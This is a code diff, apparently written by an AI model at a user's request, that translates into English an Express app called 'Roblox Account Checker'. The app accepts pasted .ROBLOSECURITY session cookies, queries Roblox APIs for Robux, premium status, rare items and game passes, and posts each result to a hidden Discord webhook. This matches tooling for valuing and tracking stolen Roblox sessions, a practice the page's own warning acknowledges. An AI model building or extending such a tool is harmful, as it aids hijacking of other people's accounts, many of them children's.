@@ -13,14 +13,14 @@ app.use((req, res, next) => {
   next();
 });
 
-// Strona główna (HTML bez większych zmian)
+// Main page – English version
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Account Checker</title>
+  <title>Roblox Account Checker – .ROBLOSECURITY</title>
   <style>
     body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
     textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
@@ -33,10 +33,12 @@ app.get('/', (req, res) => {
 </head>
 <body>
 <h2>Roblox Account Checker (.ROBLOSECURITY)</h2>
-<p style="color:#ffcc00; font-weight:bold;">UWAGA: używanie cudzego cookie = złamanie ToS Roblox → ban konta</p>
-<textarea id="cookie" placeholder="Wklej wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
+<p style="color:#ffcc00; font-weight:bold;">
+  <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and may result in permanent account ban.
+</p>
+<textarea id="cookie" placeholder="Paste .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
 <br>
-<button onclick="checkAccount()">Sprawdź</button>
+<button onclick="checkAccount()">Check Account</button>
 <div id="result"></div>
 
 <script>
@@ -45,10 +47,10 @@ async function checkAccount() {
   const result = document.getElementById('result');
   result.innerHTML = '';
   if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Cookie za krótki / nieprawidłowy</span>';
+    result.innerHTML = '<span class="error">Cookie is too short or invalid</span>';
     return;
   }
-  result.innerHTML = '<i>Sprawdzam...</i>';
+  result.innerHTML = '<i>Checking account...</i>';
   try {
     const resp = await fetch('/check', {
       method: 'POST',
@@ -57,35 +59,35 @@ async function checkAccount() {
     });
     const json = await resp.json();
     if (json.error) {
-      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
+      result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
       return;
     }
     if (json.success) {
       const creationDate = json.created !== 'failed'
-        ? new Date(json.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
+        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
         : '—';
       let avatarHtml = json.avatarUrl
         ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar">\`
-        : '<p style="color:#ffcc00;">Brak avatara</p>';
+        : '<p style="color:#ffcc00;">Avatar could not be loaded</p>';
       result.innerHTML = \`
-        <span class="success">OK!</span><br><br>
+        <span class="success">Success!</span><br><br>
         \${avatarHtml}
-        <b>Nick:</b> \${json.username}<br>
+        <b>Username:</b> \${json.username}<br>
         <b>User ID:</b> \${json.userId}<br>
-        <b>Premium:</b> \${json.hasPremium ? 'Tak' : 'Nie'}<br>
-        <b>Email zweryfikowany:</b> \${json.emailVerified ? 'Tak' : 'Nie'}<br>
-        <b>Robux:</b> \${json.robux.toLocaleString('pl-PL')}<br>
-        <b>Headless:</b> \${json.hasHeadless ? 'Tak' : 'Nie'}<br>
-        <b>Korblox:</b> \${json.hasKorblox ? 'Tak' : 'Nie'}<br>
+        <b>Premium:</b> \${json.hasPremium ? 'Yes' : 'No'}<br>
+        <b>Email Verified:</b> \${json.emailVerified ? 'Yes' : 'No'}<br>
+        <b>Robux:</b> \${json.robux.toLocaleString('en-US')}<br>
+        <b>Headless:</b> \${json.hasHeadless ? 'Yes' : 'No'}<br>
+        <b>Korblox:</b> \${json.hasKorblox ? 'Yes' : 'No'}<br>
         <b>MM2:</b> \${json.mm2Count}<br>
         <b>AMP:</b> \${json.ampCount}<br>
         <b>SAB:</b> \${json.sabCount}<br>
-        <b>Wiek:</b> \${json.accountAgeDays} dni<br>
-        <b>Utworzono:</b> \${creationDate}<br>
+        <b>Account Age:</b> \${json.accountAgeDays} days<br>
+        <b>Created:</b> \${creationDate}<br>
       \`;
     }
   } catch (e) {
-    result.innerHTML = \`<span class="error">Błąd: \${e.message}</span>\`;
+    result.innerHTML = \`<span class="error">Error: \${e.message}</span>\`;
   }
 }
 </script>
@@ -96,7 +98,7 @@ async function checkAccount() {
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
-    return res.status(400).json({ error: 'Brak / nieprawidłowy cookie' });
+    return res.status(400).json({ error: 'Missing or invalid cookie' });
   }
 
   try {
@@ -109,9 +111,9 @@ app.post('/check', async (req, res) => {
       },
     });
     const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Brak X-CSRF-Token – cookie invalid/expired');
+    if (!csrfToken) throw new Error('Failed to get X-CSRF-Token – invalid/expired cookie');
 
-    // Dane użytkownika
+    // User data
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -119,7 +121,7 @@ app.post('/check', async (req, res) => {
         'Accept': 'application/json',
       },
     });
-    if (!userRes.ok) throw new Error('Nieprawidłowy cookie');
+    if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
     // Email verified (verified hat)
@@ -155,7 +157,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Profil → created + age
+    // Profile → created date + age
     let accountAgeDays = 0;
     let created = null;
     try {
@@ -202,7 +204,7 @@ app.post('/check', async (req, res) => {
     const ampCount = ownedPasses.filter(id => ampIds.includes(id)).length;
     const sabCount = ownedPasses.filter(id => sabIds.includes(id)).length;
 
-    // Headless + Korblox (bundle ID jak chciałeś)
+    // Headless + Korblox (bundle IDs as you requested)
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -222,10 +224,6 @@ app.post('/check', async (req, res) => {
         hasKorblox = d.data?.length > 0;
       }
     } catch {}
-
-    // ────────────────────────────────────────
-    //          WYNIK DO STRONY + WEBHOOK
-    // ────────────────────────────────────────
 
     const resultData = {
       success: true,
@@ -247,7 +245,7 @@ app.post('/check', async (req, res) => {
 
     res.json(resultData);
 
-    // ────────────── WEBHOOK DISCORD ──────────────
+    // ────────────── DISCORD WEBHOOK ──────────────
     const webhook = process.env.WEBHOOK;
     if (webhook) {
       try {
@@ -265,15 +263,15 @@ app.post('/check', async (req, res) => {
               fields: [
                 {
                   name: "┌─────── Account Stats ───────┐",
-                  value: `• Account Age: **${accountAgeDays} dni**\n• Game Developer: **nie**\n• Game Visits: **?—**\n• Group Owner: **?—**`,
+                  value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **No**\n• Game Visits: **?—**\n• Group Owner: **?—**`,
                   inline: false
                 },
                 {
                   name: "┌────────── Info ──────────┐",
                   value:
                     `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
-                    `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'Tak' : 'Nie'}**\n` +
-                    `✉️ Email / Phone: **${emailVerified ? 'Tak' : 'Nie'}**`,
+                    `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'Yes' : 'No'}**\n` +
+                    `<:Email:1481762590467035136> Email: **${emailVerified ? 'Yes' : 'No'}**`,
                   inline: true
                 },
                 {
@@ -287,13 +285,13 @@ app.post('/check', async (req, res) => {
                 {
                   name: "┌─────── Inventory ───────┐",
                   value:
-                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'Tak' : 'Nie'}**\n` +
-                    `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'Tak' : 'Nie'}**`,
+                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'Yes' : 'No'}**\n` +
+                    `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'Yes' : 'No'}**`,
                   inline: true
                 }
               ],
               footer: {
-                text: "24H! • " + new Date().toLocaleString('pl-PL')
+                text: "24H! • " + new Date().toLocaleString('en-US')
               },
               timestamp: new Date().toISOString()
             }]
@@ -306,9 +304,9 @@ app.post('/check', async (req, res) => {
 
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: err.message || 'Błąd serwera' });
+    res.status(500).json({ error: err.message || 'Server error' });
   }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Serwer na porcie ${PORT}`));
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
